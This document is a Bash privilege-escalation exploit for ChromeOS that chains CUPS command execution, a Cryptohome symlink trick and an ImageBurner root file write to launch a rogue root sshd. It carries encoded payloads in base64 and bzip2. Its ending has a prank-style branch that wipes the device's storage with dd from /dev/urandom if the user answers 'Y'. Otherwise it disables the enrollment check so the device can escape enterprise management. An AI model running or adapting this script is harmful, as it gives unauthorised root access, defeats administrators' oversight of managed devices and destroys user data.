# privesc v80 hyperskid NO ARC NO SSHFS NO BINARIES
# made by Rory McNamara and OlyB
# https://crbug.com/1072233 (cups, udev command execution)
# https://crbug.com/1099390 (ImageBurner file write)

get_salty_username() {
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.GetSanitizedUsername string:$1 | grep string | cut -d'"' -f2
}

dbus_pack_user() {
    user=$1
    packeduser=$(echo -n ${user} | hexdump -e '1/1 "0x%02x,"' -v | head -c -1)
    packedlen=$(printf '%x' ${#user})
    echo "0x${packedlen},${packeduser}"
}

add_printer() {
    # add the ppd from get_ppd as a printer
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.CupsAddManuallyConfiguredPrinter string:$(uuidgen) string:socket://127.0.0.1/exploit array:byte:$(get_ppd | hexdump -e '1/1 "0x%02x,"' -v | head -c -1) >/dev/null
}

printer_guid() {
    # get the guid of the printer we installed so we can remove it
    lpstat -t | grep exploit | sed -r 's/device for ([^:]*):.*/\1/'
}

remove_printer() {
    # uninstall a printer, easier than fixing up a hanging one
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.CupsRemovePrinter string:$(printer_guid) >/dev/null
}

drop_pdf() {
    # just a standard minimal pdf from the internet for its mimetype for lp
    base64 -d <<-EOF | bunzip2 -dc >$1
QlpoOTFBWSZTWV/Q+08AAH/fnH2ZQmP/xR9O3Io/995wAgggABgAMAFYNbQ1NFHqaPSD1Gj0mjQA0AAAGhoZBpNNKGmJ6gAGgAAA
BoAACU0iCnlPSYTQ0A0aMJ6mmjJoBo0Aoa0CAQhMj78A7q9GbVe08+nMSQ91L6qHvUE1Cwe0Xyz2LYR4AhU09pyWRMwWCVDjDEGY
MgmYtOJIhZgOoXeipYcMU8Y48gqCaR92C2H9L9TBtoiNRh1a6Jr4TBcxI5r/DPbxbWCl50OkhQHUXGpYPOV4UoYdgvJgcIMKm7XC
Ma4YsbtJSnuJ7MvFHKpbCeEViJAcdxahXADBjdMZFXAAtEQFm5KKGBIdjAKOoy2zOEzC3k2iSJBJhNm3NVTZ66jtjCnTkA1z5/ij
OGyuXsw+FqmiEh3gMIUU586IqrFrDrlw1RW/zKa9RAA9J1tcwzyG+AwEhUjNUR4BgBt0lUPzGXTg9AnZr6hxDXFMJGnQVgIYAkpa
j10oCHKzGjJUwAiZHIUEcn8XckU4UJBf0PtP
EOF
}

get_ppd() {
    # ppd which runs /tmp/p > /tmp/l as cups:root via FoomaticRIPCommandLine
    # confirms complete by writing to fifo at /tmp/f
    base64 -d <<-EOF | bunzip2 -dc
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
KEgHBHVNAA==
EOF
}

trigger_cups() {
    # trigger FoomaticRIPCommandLine by adding a printer, 'printing' a pdf, and removing the printer
    # the fifo is just for timing
    add_printer
    mkfifo -m 777 /tmp/f
    touch /tmp/l
    chmod 777 /tmp/l
    triggerpdf=$(mktemp)
    drop_pdf ${triggerpdf}
    lp -d $(printer_guid) ${triggerpdf} >/dev/null
    rm ${triggerpdf}
    cat /tmp/f >/dev/null
    rm /tmp/f /tmp/l /tmp/p
    remove_printer
}

viacups() {
    # generic handler for each of the /tmp/p stagers
    $@
    trigger_cups
}

stage_sshd() {
    # set up a fake ssh server using the system sshd and enabling passwordless login for root with the provided key
    if [ ! -e /tmp/ssh_host_rsa_key ]; then
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
    fi
    cat >/tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
    rm -f /home/chronos/user/.ssh/known_hosts
}

stage_rescan() {
    # create the script for cups to remove and readd the pci device. This _may_ have unknown side effects
    # but none were seen during testing
    cat >/tmp/p <<-EOF
echo 1 > /sys/devices/pci0000\:00/0000\:00\:00.0/remove
echo 1 > /sys/devices/pci0000\:00/pci_bus/0000\:00/rescan
EOF
}

runasroot() {
    ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
}

MountEx() {
    packeduser=$1
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx \
        array:byte:0x12,${packeduser} \
        array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74 \
        array:byte:0x8,0x0,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74,0x20,0x0,0x30,0x0 >/dev/null
}

UnmountEx() {
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.UnmountEx \
        array:byte: >/dev/null
}

getdevaccess() {
    packed=$(dbus_pack_user ${tgtuser})

    MountEx ${packed}

    rmdir /home/user/${salty_user}/GCache/v2 2>/dev/null
    rm /home/user/${salty_user}/GCache/v2 2>/dev/null
    ln -s /dev /home/user/${salty_user}/GCache/v2

    UnmountEx
    MountEx ${packed}
}

root_filewrite() {
    echo "E:REMOVE_CMD=/bin/sh -c '/usr/sbin/sshd -f /tmp/sshd_config'" >/home/chronos/u-${salty_user}/Downloads/udev_trolling

    ln -s /run/udev/data/+pci:0000:00:00.0 /dev/sdz
    dbus-send --system --print-reply --dest=org.chromium.ImageBurner /org/chromium/ImageBurner org.chromium.ImageBurnerInterface.BurnImage string:/home/chronos/u-${salty_user}/Downloads/udev_trolling string:/dev/sdz >/dev/null
}

tgtuser=$(hexdump -e '1/8 "%02x\n"' -n 8 /dev/urandom)@test.test
salty_user="$(get_salty_username ${tgtuser})"

echo "Staging sshd..."
stage_sshd

echo "Getting /dev access..."
getdevaccess

echo "Root file write..."
root_filewrite

echo "Triggering REMOVE_CMD execution..."
viacups stage_rescan

echo "Cleaning up /home/root..."
runasroot "find /home/root -maxdepth 1 -user cups -exec rm -rf {} +"

echo "Just making sure again, are you a sysadmin? (be honest) (Y/N)"
read sysadmin
if [[ $sysadmin == "Y" || $sysadmin == "y" ]]; then
    runasroot dd if=/dev/urandom of=/dev/mmcblk0 &
    sleep 3
    runasroot reboot
    echo "rebooting...."
    exit
fi
echo "Providing root shell..."
runasroot vpd -i RW_VPD -s check_enrollment=0
